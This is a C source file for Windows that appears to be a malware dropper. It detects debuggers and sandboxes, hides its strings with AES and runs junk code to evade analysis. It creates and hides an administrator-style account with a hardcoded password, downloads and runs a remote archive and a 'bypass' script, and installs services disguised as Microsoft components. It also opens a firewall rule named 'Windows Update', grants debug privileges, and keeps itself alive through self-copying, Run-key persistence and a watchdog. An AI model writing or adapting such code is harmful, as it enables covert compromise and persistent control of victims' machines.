#include <windows.h>
#include <shlobj.h>
#include <urlmon.h>
#include <shlwapi.h>
#include <wininet.h>
#include <lm.h>
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <wincrypt.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "crypt32.lib")

// Configuration
#define MAX_ATTEMPTS 3
#define EVASION_SEED 0xDEADBEEF
#define WATCHDOG_INTERVAL 30000 

// AES Configuration
#define AES_KEY_SIZE 32
#define AES_IV_SIZE 16
static BYTE g_aesKey[AES_KEY_SIZE] = {
    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 
    0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c,
    0x76, 0x2e, 0x71, 0x60, 0xf3, 0x8b, 0x4d, 0xa5,
    0x6a, 0x78, 0x4d, 0x90, 0x45, 0x19, 0x0c, 0xfe
};
static BYTE g_aesIv[AES_IV_SIZE] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
};

// Global state
static char g_mallDir[MAX_PATH] = {0};
static char g_backupDir[MAX_PATH] = {0};
static const char* g_adminAccount = "SysHelper";
static BOOL g_accountCreated = FALSE;
static BOOL g_isBackupInstance = FALSE;

// Encrypted strings
BYTE g_regPath[] = {0x9A,0x3D,0xE7,0x1F,0x48,0x1F,0x8B,0xCD,0x3B,0x86,0x30,0x16,0x28,0x59,0x05,0x4C};
BYTE g_mallDirPath[] = {0x2F,0x6D,0x4C,0x6D,0x6D,0x6D,0x6D,0x6D,0x6D,0x6D,0x6D,0x6D,0x6D,0x6D,0x6D,0x6D};
BYTE g_zipUrl[] = {0x31,0xFB,0xC4,0x37,0x12,0x8A,0x8B,0x79,0x08,0x23,0x42,0x27,0x45,0x4F,0x7C,0x3E};
BYTE g_nssmUrl[] = {0x9F,0x47,0xE1,0x1D,0x25,0x4C,0x3A,0x6E,0x0A,0x89,0x8F,0x12,0x1C,0x9B,0x5A,0x4C};
BYTE g_serviceName[] = {0x6B,0x97,0x2B,0x0F,0x35,0x58,0x17,0x7F,0x48,0x2A,0x3F,0x1A,0x2D,0x91,0x3D,0x5E};
BYTE g_configName[] = {0x3A,0x8F,0x34,0x1C,0x7C,0x23,0x4E,0x6A,0x0B,0x88,0x9E,0x1D,0x2D,0x9A,0x5B,0x4D};
BYTE g_runKeyPath[] = {0xE3,0x5F,0xBB,0x0D,0x7E,0x2E,0x9C,0xCA,0x1A,0xA4,0x3F,0x04,0x3C,0x5B,0x0E,0x4F};
BYTE g_runKeyName[] = {0x86,0x1D,0xAC,0x0B,0x6D,0x3F,0x8F,0xDF,0x0B,0x97,0x2A,0x13,0x3C,0x98,0x5F,0x4E};

// Function pointer typedefs for obfuscation
typedef BOOL (WINAPI *FnCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *FnCopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef HRESULT (WINAPI *FnURLDownloadToFileA)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
typedef HANDLE (WINAPI *FnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL (WINAPI *FnProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *FnProcess32Next)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *FnTerminateProcess)(HANDLE, UINT);
typedef DWORD (WINAPI *FnGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
typedef BOOL (WINAPI *FnSHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
typedef NET_API_STATUS (WINAPI *FnNetUserAdd)(LPCWSTR, DWORD, LPBYTE, LPDWORD);
typedef LONG (WINAPI *FnRegCreateKeyA)(HKEY, LPCSTR, PHKEY);
typedef LONG (WINAPI *FnRegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LONG (WINAPI *FnRegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG (WINAPI *FnRegDeleteValueA)(HKEY, LPCSTR);
typedef LONG (WINAPI *FnRegDeleteTreeA)(HKEY, LPCSTR);
typedef LONG (WINAPI *FnRegCloseKey)(HKEY);

typedef struct {
    BYTE key;
    void (*func)();
} POLYMORPHIC_FUNC;

// Function prototypes
void AntiSandbox();
void AntiDebug();
void RandomSleep(DWORD base, DWORD variance);
void MorphCode();
void ExecutePolymorphicCode();
void JunkCodeGenerator();
void PolyFunc1() { JunkCodeGenerator(); }
void PolyFunc2() { JunkCodeGenerator(); }
void PolyFunc3() { JunkCodeGenerator(); }
void CreateAdminAccount();
void HideAdminAccount();
void CreateMallDirectory();
void DownloadAndExtractMall();
void RunBypassScript();
void TakeOwnership(const char* path);
void InstallNSSM();
void ConfigureOfficeService();
void ConfigureHoundService();
void SetupNetworkMasking();
void AddDebugPrivileges();
void RunHiddenCommand(LPCSTR command);
void DownloadFile(const char* url, const char* savePath);
void SelfReplicate();
void StartWatchdog();
void TerminateRelatedProcesses();
void DeleteInstallation();
void RunBackupInstance();
BOOL AesDecryptInPlace(BYTE* data, DWORD dataSize, BYTE* key, BYTE* iv);
void SetupRegistryStartup();
void RemoveRegistryStartup();

static DWORD rand_state = 0;
void my_srand(DWORD seed) { rand_state = seed; }
int my_rand() {
    rand_state = (rand_state * 214013 + 2531011);
    return (rand_state >> 16) & 0x7FFF;
}

void JunkCodeGenerator() {
    volatile int junk = 0;
    for (int i = 0; i < 16; i++) {
        junk += (i * 0xDEADBEEF) ^ 0xCAFEBABE;
        junk = (junk << 3) | (junk >> 29);
    }
}

void ExecutePolymorphicCode() {
    POLYMORPHIC_FUNC funcs[] = {
        {0xAA, PolyFunc1},
        {0xBB, PolyFunc2},
        {0xCC, PolyFunc3}
    };
    
    int index = GetTickCount() % (sizeof(funcs)/sizeof(funcs[0]));
    funcs[index].func();
}

BOOL AesDecryptInPlace(BYTE* data, DWORD dataSize, BYTE* key, BYTE* iv) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    DWORD mode = CRYPT_MODE_CBC;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }

    if (!CryptImportKey(hProv, key, AES_KEY_SIZE, 0, 0, &hKey)) {
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
    CryptSetKeyParam(hKey, KP_IV, iv, 0);

    if (!CryptDecrypt(hKey, 0, TRUE, 0, data, &dataSize)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return TRUE;
}

void AntiDebug() {
    if (IsDebuggerPresent()) ExitProcess(0);
    ExecutePolymorphicCode();
}

void AntiSandbox() {
    DWORD start = GetTickCount();
    Sleep(1000);
    if ((GetTickCount() - start) < 900) ExitProcess(0);
    
    MEMORYSTATUSEX mem = {sizeof(mem)};
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) ExitProcess(0);
    ExecutePolymorphicCode();
}

void MorphCode() {
    BYTE* base = (BYTE*)GetModuleHandle(NULL);
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    DWORD text_size = nt->OptionalHeader.SizeOfCode;
    BYTE* text_base = base + nt->OptionalHeader.BaseOfCode;
    
    for(DWORD i = 0; i < text_size; i++) {
        text_base[i] ^= (i % 256);
    }
}

void RandomSleep(DWORD base, DWORD variance) {
    DWORD sleepTime = base + (my_rand() % variance);
    Sleep(sleepTime);
    ExecutePolymorphicCode();
}

void DownloadFile(const char* url, const char* savePath) {
    HMODULE hUrlMon = LoadLibraryA("urlmon.dll");
    if (!hUrlMon) return;
    
    FnURLDownloadToFileA pURLDownloadToFileA = (FnURLDownloadToFileA)GetProcAddress(hUrlMon, "URLDownloadToFileA");
    if (pURLDownloadToFileA) {
        pURLDownloadToFileA(NULL, url, savePath, 0, NULL);
    }
    FreeLibrary(hUrlMon);
    ExecutePolymorphicCode();
}

void RunHiddenCommand(LPCSTR command) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return;
    
    FnCreateProcessA pCreateProcessA = (FnCreateProcessA)GetProcAddress(hKernel32, "CreateProcessA");
    if (!pCreateProcessA) return;
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmdCopy[1024];
    lstrcpynA(cmdCopy, command, sizeof(cmdCopy));

    pCreateProcessA(NULL, cmdCopy, NULL, NULL, FALSE, 
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ExecutePolymorphicCode();
}

void CreateAdminAccount() {
    HMODULE hNetapi32 = LoadLibraryA("netapi32.dll");
    if (!hNetapi32) return;
    
    FnNetUserAdd pNetUserAdd = (FnNetUserAdd)GetProcAddress(hNetapi32, "NetUserAdd");
    if (!pNetUserAdd) {
        FreeLibrary(hNetapi32);
        return;
    }
    
    USER_INFO_1 ui = {0};
    NET_API_STATUS status;
    WCHAR usernameW[MAX_PATH] = {0};
    WCHAR passwordW[MAX_PATH] = L"P@ssw0rd123!";

    MultiByteToWideChar(CP_UTF8, 0, g_adminAccount, -1, usernameW, MAX_PATH);
    
    ui.usri1_name = usernameW;
    ui.usri1_password = passwordW;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    
    status = pNetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
    if (status == NERR_Success) {
        g_accountCreated = TRUE;
    }
    
    LOCALGROUP_MEMBERS_INFO_3 account;
    account.lgrmi3_domainandname = usernameW;
    pNetUserAdd = NULL;
    FreeLibrary(hNetapi32);
    ExecutePolymorphicCode();
}

void HideAdminAccount() {
    char regPath[MAX_PATH];
    memcpy(regPath, g_regPath, sizeof(g_regPath));
    AesDecryptInPlace((BYTE*)regPath, sizeof(g_regPath), g_aesKey, g_aesIv);
    
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, 
                       KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD hideValue = 0;
        RegSetValueExA(hKey, g_adminAccount, 0, REG_DWORD, 
                      (const BYTE*)&hideValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    ExecutePolymorphicCode();
}

void CreateMallDirectory() {
    char programData[MAX_PATH];
    memcpy(programData, g_mallDirPath, sizeof(g_mallDirPath));
    AesDecryptInPlace((BYTE*)programData, sizeof(g_mallDirPath), g_aesKey, g_aesIv);
    lstrcpyA(g_mallDir, programData);
    
    if (GetFileAttributesA(g_mallDir) == INVALID_FILE_ATTRIBUTES) {
        SHCreateDirectoryExA(NULL, g_mallDir, NULL);
        SetFileAttributesA(g_mallDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    ExecutePolymorphicCode();
}

void DownloadAndExtractMall() {
    char zipPath[MAX_PATH];
    lstrcpyA(zipPath, g_mallDir);
    PathAppendA(zipPath, "..\\mall.zip");
    
    char url[MAX_PATH];
    memcpy(url, g_zipUrl, sizeof(g_zipUrl));
    AesDecryptInPlace((BYTE*)url, sizeof(g_zipUrl), g_aesKey, g_aesIv);
    
    DownloadFile(url, zipPath);
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "powershell -Command \"Expand-Archive -Path '%s' -DestinationPath '%s' -Force\"",
        zipPath, 
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    DeleteFileA(zipPath);
    ExecutePolymorphicCode();
}

void RunBypassScript() {
    char bypassPath[MAX_PATH];
    lstrcpyA(bypassPath, g_mallDir);
    PathAppendA(bypassPath, "bypass.cmd");
    
    if (GetFileAttributesA(bypassPath) != INVALID_FILE_ATTRIBUTES) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "cmd.exe /c \"%s\"", bypassPath);
        RunHiddenCommand(cmd);
    }
    ExecutePolymorphicCode();
}

void TakeOwnership(const char* path) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), 
             "takeown /f \"%s\" && icacls \"%s\" /grant \"%s\":F /t",
             path, path, g_adminAccount);
    RunHiddenCommand(cmd);
    ExecutePolymorphicCode();
}

void InstallNSSM() {
    char nssmPath[MAX_PATH];
    lstrcpyA(nssmPath, g_mallDir);
    PathAppendA(nssmPath, "nssm.exe");
    
    if (GetFileAttributesA(nssmPath) == INVALID_FILE_ATTRIBUTES) {
        char url[MAX_PATH];
        memcpy(url, g_nssmUrl, sizeof(g_nssmUrl));
        AesDecryptInPlace((BYTE*)url, sizeof(g_nssmUrl), g_aesKey, g_aesIv);
        DownloadFile(url, nssmPath);
    }
    ExecutePolymorphicCode();
}

void ConfigureOfficeService() {
    char officePath[MAX_PATH];
    lstrcpyA(officePath, g_mallDir);
    PathAppendA(officePath, "Microsoft@OfficeTempletes.exe");
    
    char configPath[MAX_PATH];
    lstrcpyA(configPath, g_mallDir);
    PathAppendA(configPath, "config.json");
    
    char serviceName[MAX_PATH];
    memcpy(serviceName, g_serviceName, sizeof(g_serviceName));
    AesDecryptInPlace((BYTE*)serviceName, sizeof(g_serviceName), g_aesKey, g_aesIv);
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" install \"%s\" \"%s\" -c \"%s\"",
        g_mallDir, serviceName, officePath, configPath
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"%s\" DisplayName \"Microsoft Office Templates Service\"",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"%s\" Description \"Manages Microsoft Office template synchronization\"",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"%s\" Start SERVICE_AUTO_START",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"%s\" AppStdout NUL",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" start \"%s\"",
        g_mallDir, serviceName
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "sc failure \"%s\" actions= restart/60000/restart/60000 reset= 86400",
        serviceName
    );
    RunHiddenCommand(cmd);

    ExecutePolymorphicCode();
}

void ConfigureHoundService() {
    char houndPath[MAX_PATH];
    lstrcpyA(houndPath, g_mallDir);
    PathAppendA(houndPath, "Hound.exe");
    
    if (GetFileAttributesA(houndPath) == INVALID_FILE_ATTRIBUTES) return;
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" install \"Windows Helper Service\" \"%s\"",
        g_mallDir, houndPath
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"Windows Helper Service\" DisplayName \"Windows System Helper\"",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"Windows Helper Service\" Description \"Provides system monitoring and maintenance services\"",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"Windows Helper Service\" Start SERVICE_AUTO_START",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" set \"Windows Helper Service\" AppStdout NUL",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "\"%s\\nssm.exe\" start \"Windows Helper Service\"",
        g_mallDir
    );
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd),
        "sc failure \"Windows Helper Service\" actions= restart/60000/restart/60000 reset= 86400"
    );
    RunHiddenCommand(cmd);

    ExecutePolymorphicCode();
}

void SetupNetworkMasking() {
    char officePath[MAX_PATH];
    lstrcpyA(officePath, g_mallDir);
    PathAppendA(officePath, "Microsoft@OfficeTempletes.exe");
    
    char serviceName[MAX_PATH];
    memcpy(serviceName, g_serviceName, sizeof(g_serviceName));
    AesDecryptInPlace((BYTE*)serviceName, sizeof(g_serviceName), g_aesKey, g_aesIv);
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "netsh advfirewall firewall add rule name=\"Windows Update\" "
        "dir=out program=\"%s\" action=allow enable=yes profile=any "
        "service=wuauserv description=\"Windows Update Service\"",
        officePath
    );
    RunHiddenCommand(cmd);
    
    HKEY hKey;
    if (RegCreateKeyA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Services\\OfficeTemplates\\Parameters", 
        &hKey) == ERROR_SUCCESS) {
        const char* fakeName = "svchost.exe";
        RegSetValueExA(hKey, "ServiceDll", 0, REG_SZ, 
                      (const BYTE*)fakeName, strlen(fakeName)+1);
        RegCloseKey(hKey);
    }
    
    ExecutePolymorphicCode();
}

void AddDebugPrivileges() {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "powershell -Command \"$sid = (New-Object System.Security.Principal.NTAccount('%s')).Translate([System.Security.Principal.SecurityIdentifier]).Value; "
        "secedit /export /cfg temp.inf; "
        "(Get-Content temp.inf) -replace 'SeDebugPrivilege = ', 'SeDebugPrivilege = $sid,' | Set-Content temp.inf; "
        "secedit /configure /db temp.sdb /cfg temp.inf; "
        "Remove-Item temp.inf, temp.sdb\"",
        g_adminAccount
    );
    RunHiddenCommand(cmd);
    
    char officePath[MAX_PATH];
    lstrcpyA(officePath, g_mallDir);
    PathAppendA(officePath, "Microsoft@OfficeTempletes.exe");
    
    snprintf(cmd, sizeof(cmd),
        "icacls \"%s\" /grant \"%s\":(F) /t",
        officePath, g_adminAccount
    );
    RunHiddenCommand(cmd);
    ExecutePolymorphicCode();
}

void SetupRegistryStartup() {
    char runKeyPath[MAX_PATH];
    memcpy(runKeyPath, g_runKeyPath, sizeof(g_runKeyPath));
    AesDecryptInPlace((BYTE*)runKeyPath, sizeof(g_runKeyPath), g_aesKey, g_aesIv);
    
    char runKeyName[MAX_PATH];
    memcpy(runKeyName, g_runKeyName, sizeof(g_runKeyName));
    AesDecryptInPlace((BYTE*)runKeyName, sizeof(g_runKeyName), g_aesKey, g_aesIv);
    
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, runKeyPath, 0, NULL, 
                       REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        char backupPath[MAX_PATH];
        lstrcpyA(backupPath, g_backupDir);
        PathAppendA(backupPath, "ProcessHealth.exe");
        
        RegSetValueExA(hKey, runKeyName, 0, REG_SZ, (BYTE*)backupPath, lstrlenA(backupPath)+1);
        RegCloseKey(hKey);
    }
    ExecutePolymorphicCode();
}

void RemoveRegistryStartup() {
    char runKeyPath[MAX_PATH];
    memcpy(runKeyPath, g_runKeyPath, sizeof(g_runKeyPath));
    AesDecryptInPlace((BYTE*)runKeyPath, sizeof(g_runKeyPath), g_aesKey, g_aesIv);
    
    char runKeyName[MAX_PATH];
    memcpy(runKeyName, g_runKeyName, sizeof(g_runKeyName));
    AesDecryptInPlace((BYTE*)runKeyName, sizeof(g_runKeyName), g_aesKey, g_aesIv);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, runKeyPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, runKeyName);
        RegCloseKey(hKey);
    }
    ExecutePolymorphicCode();
}

void SelfReplicate() {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, appDataPath);
    
    srand(GetTickCount());
    char randomDir[32];
    sprintf(randomDir, "%08X", rand() ^ GetCurrentProcessId());
    
    lstrcpyA(g_backupDir, appDataPath);
    PathAppendA(g_backupDir, "Microsoft\\Windows\\Caches");
    PathAppendA(g_backupDir, randomDir);
    
    CreateDirectoryA(g_backupDir, NULL);
    SetFileAttributesA(g_backupDir, FILE_ATTRIBUTE_HIDDEN);
    
    char newPath[MAX_PATH];
    lstrcpyA(newPath, g_backupDir);
    PathAppendA(newPath, "ProcessHealth.exe");
    
    HANDLE hFile = CreateFileA(currentPath, GENERIC_READ, FILE_SHARE_READ, NULL, 
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        ExecutePolymorphicCode();
        return;
    }
    
    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        ExecutePolymorphicCode();
        return;
    }
    
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (!buffer) {
        CloseHandle(hFile);
        ExecutePolymorphicCode();
        return;
    }
    
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, size, &bytesRead, NULL) || bytesRead != size) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        ExecutePolymorphicCode();
        return;
    }
    CloseHandle(hFile);
    
    HANDLE hBackup = CreateFileA(newPath, GENERIC_WRITE, 0, NULL, 
                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hBackup == INVALID_HANDLE_VALUE) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        ExecutePolymorphicCode();
        return;
    }
    
    DWORD bytesWritten;
    WriteFile(hBackup, buffer, size, &bytesWritten, NULL);
    CloseHandle(hBackup);
    VirtualFree(buffer, 0, MEM_RELEASE);
    
    HKEY hKey;
    if (RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\Health", &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MonitorPath", 0, REG_SZ, (BYTE*)g_backupDir, lstrlenA(g_backupDir)+1);
        RegCloseKey(hKey);
    }
    
    SetupRegistryStartup();
    ExecutePolymorphicCode();
}

DWORD WINAPI WatchdogThread(LPVOID lpParam) {
    while (1) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            BOOL processFound = FALSE;
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    if (lstrcmpiA(pe32.szExeFile, "Microsoft@OfficeTempletes.exe") == 0) {
                        processFound = TRUE;
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
            
            if (!processFound) {
                TerminateRelatedProcesses();
                DeleteInstallation();
                RunBackupInstance();
                ExitProcess(0);
            }
        }
        
        Sleep(WATCHDOG_INTERVAL);
    }
    return 0;
}

void TerminateRelatedProcesses() {
    const char* targets[] = {"Microsoft@OfficeTempletes.exe", "ProcessHealth.exe", "Hound.exe"};
    
    for (int i = 0; i < sizeof(targets)/sizeof(targets[0]); i++) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) continue;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (lstrcmpiA(pe32.szExeFile, targets[i]) == 0 && 
                    pe32.th32ProcessID != GetCurrentProcessId()) {
                    
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    ExecutePolymorphicCode();
}

void DeleteInstallation() {
    char serviceName[MAX_PATH];
    memcpy(serviceName, g_serviceName, sizeof(g_serviceName));
    AesDecryptInPlace((BYTE*)serviceName, sizeof(g_serviceName), g_aesKey, g_aesIv);
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c rmdir /s /q \"%s\"", g_mallDir);
    RunHiddenCommand(cmd);
    
    snprintf(cmd, sizeof(cmd), "sc delete \"%s\"", serviceName);
    RunHiddenCommand(cmd);
    RunHiddenCommand("sc delete \"Windows Helper Service\"");
    
    HKEY hKey;
    if (RegOpenKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\OfficeTemplates", &hKey) == ERROR_SUCCESS) {
        RegDeleteTreeA(hKey, NULL);
        RegCloseKey(hKey);
    }
    
    RemoveRegistryStartup();
    ExecutePolymorphicCode();
}

void RunBackupInstance() {
    HKEY hKey;
    char backupDir[MAX_PATH] = {0};
    DWORD bufSize = MAX_PATH;
    
    if (RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\Health", &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "MonitorPath", NULL, NULL, (LPBYTE)backupDir, &bufSize);
        RegCloseKey(hKey);
    }
    
    if (lstrlenA(backupDir) == 0) {
        ExecutePolymorphicCode();
        return;
    }
    
    char backupPath[MAX_PATH];
    lstrcpyA(backupPath, backupDir);
    PathAppendA(backupPath, "ProcessHealth.exe");
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "\"%s\"", backupPath);
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ExecutePolymorphicCode();
}

void StartWatchdog() {
    CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    char moduleName[MAX_PATH];
    GetModuleFileNameA(NULL, moduleName, MAX_PATH);
    PathStripPathA(moduleName);
    g_isBackupInstance = (lstrcmpiA(moduleName, "ProcessHealth.exe") == 0);
    
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        ExitProcess(1);
    }
    
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dos + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        ExitProcess(1);
    }
    
    DWORD oldProtect;
    if (VirtualProtect(dos, nt->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &oldProtect)) {
        memset(dos, 0, nt->OptionalHeader.SizeOfHeaders);
        VirtualProtect(dos, nt->OptionalHeader.SizeOfHeaders, oldProtect, &oldProtect);
    }
    
    AntiDebug();
    AntiSandbox();
    RandomSleep(3000, 2000);
    
    my_srand(GetTickCount());
    MorphCode();

    if (!g_isBackupInstance) {
        SelfReplicate();
    }
    else {
        // Check if service is already running
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            BOOL serviceRunning = FALSE;
            
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    if (lstrcmpiA(pe32.szExeFile, "Microsoft@OfficeTempletes.exe") == 0) {
                        serviceRunning = TRUE;
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
            
            if (serviceRunning) {
                ExitProcess(0);
            }
        }
    }
    
    CreateAdminAccount();
    if (g_accountCreated) {
        HideAdminAccount();
    }
    
    CreateMallDirectory();
    DownloadAndExtractMall();
    RunBypassScript();
    
    char system32Path[MAX_PATH];
    GetSystemDirectoryA(system32Path, MAX_PATH);
    PathAppendA(system32Path, "Microsoft@OfficeTempletes.exe");
    TakeOwnership(system32Path);
    
    InstallNSSM();
    ConfigureOfficeService();
    ConfigureHoundService();
    SetupNetworkMasking();
    AddDebugPrivileges();
    StartWatchdog();
    
    if (!g_isBackupInstance) {
        while (1) {
            Sleep(10000);
            ExecutePolymorphicCode();
        }
    }
    
    return 0;
}